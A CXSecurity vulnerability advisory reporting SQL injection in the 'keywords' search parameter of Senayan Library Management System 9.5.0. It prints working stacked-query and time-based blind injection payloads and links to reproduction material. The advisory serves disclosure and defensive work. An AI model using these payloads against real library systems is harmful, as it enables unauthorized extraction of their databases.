---
title: Senayan Library Management System 9.5.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022110006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-05
fetch_date: 2025-10-03T21:42:54.631691
---

# Senayan Library Management System 9.5.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Senayan Library Management System 9.5.0 SQL Injection** **2022.11.04**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Senayan Library Management System v9.5.0 a.k.a SLIMS 9 BULIAN SQLi
## Author: nu11secur1ty
## Date: 11.03.2022
## Vendor: https://slims.web.id/web/
## Software: https://github.com/slims/slims9\_bulian/releases
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.5.0
## Description:
The `keywords` parameter appears to be vulnerable to SQL injection attacks.
A single quote was submitted in the keywords parameter, and a general
error message was returned.
Two single quotes were then submitted and the error message
disappeared. The injection is confirmed manually from nu11secur1ty.
The attacker can retrieve all information from the database of this
system, by using this vulnerability.
## STATUS: HIGH Vulnerability
[+] Payload:
```MySQL
---
Parameter: keywords (GET)
Type: stacked queries
Title: MySQL >= 5.0.12 stacked queries (comment)
Payload: csrf\_token=a1266f4d54772e420f61cc03fe613b994f282c15271084e39c31f9267b55d50df06861&search=search&keywords=tfxgst7flvw5snn6r1b24fnyu8neev6w4v6u1uik7''')));SELECT
SLEEP(5)#
Type: time-based blind
Title: MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)
Payload: csrf\_token=a1266f4d54772e420f61cc03fe613b994f282c15271084e39c31f9267b55d50df06861&search=search&keywords=tfxgst7flvw5snn6r1b24fnyu8neev6w4v6u1uik7''')))
RLIKE (SELECT 9971 FROM (SELECT(SLEEP(5)))bdiv)#
---
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.5.0)
## Proof and Exploit:
[href](https://streamable.com/63og5v)
## Time spent
`3:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 -1

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top